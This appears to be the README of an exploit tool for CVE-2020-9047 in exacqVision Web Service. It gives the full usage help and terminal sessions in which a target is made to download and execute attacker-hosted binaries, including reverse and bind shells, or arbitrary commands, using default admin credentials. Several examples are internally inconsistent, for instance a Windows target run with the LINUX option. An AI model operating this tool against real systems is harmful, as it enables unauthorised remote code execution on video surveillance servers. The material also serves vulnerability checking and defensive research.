### Usage/Help Menu

```
usage: CVE-2020-9047.py [-h] [-p RPORT] [-s LPORT] [--command] [-d WEBDIR]
                        [-U USERNAME] [-P PASSWORD]
                        {WINDOWS,LINUX,CHECK} RHOST LHOST PAYLOAD

Exploit for exacqVision Web Service as outlined in CVE-2020-9047. This program
targets Windows and Linux x86 installations of exacqVision Web Service
versions 3.8.2.67295 - 20.06.3.0. Written by Michael W. Norris.

positional arguments:
  {WINDOWS,LINUX,CHECK}
                        The target operating system. Provide "WINDOWS" for
                        Windows, "LINUX" for Linux, or "CHECK" to have this
                        program perform a check. When using "CHECK", '' can be
                        provided for the LHOST and PAYLOAD arguments.
  RHOST                 The IP address of the remote host; the IP address of
                        the target.
  LHOST                 The local IP address that will serve the payload for
                        the remote host. This should not be "localhost" or
                        "127.0.0.1". The remote host will need to be able to
                        connect to the provided IP address. This program
                        should be run on the system with the specified IP
                        address.
  PAYLOAD               The absolute file path of an existing Windows
                        executable (.exe) or Linux binary file on the local
                        system. The binary will be executed on the remote
                        host. If the --command flag is set and "LINUX" was
                        provided as the TARGET argument, enter a command that
                        will be executed on the remote host.

optional arguments:
  -h, --help            show this help message and exit
  -p RPORT              The port on the remote host where exacqVision Web
                        Service is running. Default: 80
  -s LPORT              The local port that will be used to serve the payload
                        file for the remote host. Default: 8000
  --command             Sets the command flag. The flag allows for a command
                        to be provided as the PAYLOAD argument instead of a
                        file path to a binary. The provided command will be
                        executed on the remote host. The flag should be set
                        only if "LINUX" was provided as the TARGET argument.
  -d WEBDIR             The local existing directory where a randomly named
                        temporary directory will be created. Default: /tmp
  -U USERNAME           The username for authenticating to the remote
                        exacqVision Web Service application. Default: admin
  -P PASSWORD           The password for authenticating to the remote
                        exacqVision Web Service application. Default: admin256
```

### Usage Example I: System Check
To check whether a system is vulnerable to CVE-2020-9047 as well as susceptible to this exploit and/or to fingerprint the remote host's operating system/architecture, use the following command syntax. In this example, the remote host is 10.0.0.22 (`RHOST`).

```
┌─[root@parrot]─[~/demo]
└──╼ #python3 CVE-2020-9047.py CHECK 10.0.0.22 '' ''
Target OS: Linux i686
EVWS Version: 7.8.2.97826

Exploitable: YES
```

### Usage Example II: Linux ELF File Payload
To instruct the remote Linux system 10.0.0.22 (`RHOST`) running exacqVision Web Service on TCP port 8080 to install/execute an ELF binary payload that is present on the local system 10.0.0.11 (`LHOST`) on TCP port 80 at absolute file path `/root/demo/shell_reverse_tcp` (`PAYLOAD`), use the following command syntax.

```
┌─[root@parrot]─[~/demo]
└──╼ #python3 CVE-2020-9047.py LINUX 10.0.0.22 -p 8080 10.0.0.11 -s 80 '/root/demo/ping_me'
Target OS: Linux i686
EVWS Version: 7.8.2.97826

Exploitable: YES
Confirm the specified PAYLOAD is compatible with the remote architecture
Press ENTER to continue or CTRL+C to exit

Starting HTTP server on 0.0.0.0:80
Serving payload from /tmp/tmpo7516343 directory

192.168.57.161 - - [03/Jun/2020 23:11:09] "GET /op0tv6l4 HTTP/1.1" 200 -
192.168.57.161 - - [03/Jun/2020 23:11:13] "GET /aax35u41.deb HTTP/1.1" 200 -

Removing temporary directory structure /tmp/tmpo7516343
Stopping HTTP server on 0.0.0.0:80
```

### Usage Example III: Linux Command Payload
To specify a command (`--command`) to be excuted on the remote Linux system as the `PAYLOAD` argument (instead of an ELF binary payload), use the following command syntax.

```
┌─[root@parrot]─[~/demo]
└──╼ #python3 CVE-2020-9047.py LINUX 10.0.0.22 10.0.0.11 --command 'ping -c 5 10.0.0.11'
Target OS: Linux i686
EVWS Version: 7.8.2.97826

Exploitable: YES
The provided command will be executed on the remote system
Press ENTER to continue or CTRL+C to exit

Starting HTTP server on 0.0.0.0:8000
Serving payload from /tmp/tmpp2wmx5x3 directory

192.168.57.161 - - [03/Jun/2020 23:22:04] "GET /no_n0zgk HTTP/1.1" 200 -
192.168.57.161 - - [03/Jun/2020 23:22:08] "GET /1vlkyw3.deb HTTP/1.1" 200 -

Removing temporary directory structure /tmp/tmpp2wmx5x3
Stopping HTTP server on 0.0.0.0:8000
```

*Note: Specifying a command as a the PAYLOAD argument is only supported for remote Linux hosts.*

### Usage Example IV: Windows Executable File Payload
To instruct the remote Windows system 10.0.0.33 (`RHOST`) with the exacqVision Web Service password of `asdf1234!@#$` to install/execute a Windows executable payload that is present on the local system 10.0.0.11 (`LHOST`) at absolute file path `/root/demo/shell_bind_tcp.exe` (`PAYLOAD`), use the following command syntax.

```
┌─[root@parrot]─[~/demo]
└──╼ #python3 CVE-2020-9047.py LINUX 10.0.0.33 -P 'asdf1234!@#$' 10.0.0.11 '/root/demo/shell_bind_tcp.exe'
Target OS: windows Intel(R) Core(TM) i3-3220 CPU @ 3.30GHz
EVWS Version: 9.8.4.149166

Exploitable: YES
Confirm the specified PAYLOAD is compatible with the remote architecture
Press ENTER to continue or CTRL+C to exit

Starting HTTP server on 0.0.0.0:8000
Serving payload from /tmp/tmpgizzpfa4 directory

192.168.57.161 - - [03/Jun/2020 23:25:09] "GET /4kdjekqk HTTP/1.1" 200 -
192.168.57.161 - - [03/Jun/2020 23:25:13] "GET /fp92ecyj.exe HTTP/1.1" 200 -

Removing temporary directory structure /tmp/tmpgizzpfa4
Stopping HTTP server on 0.0.0.0:8000
```
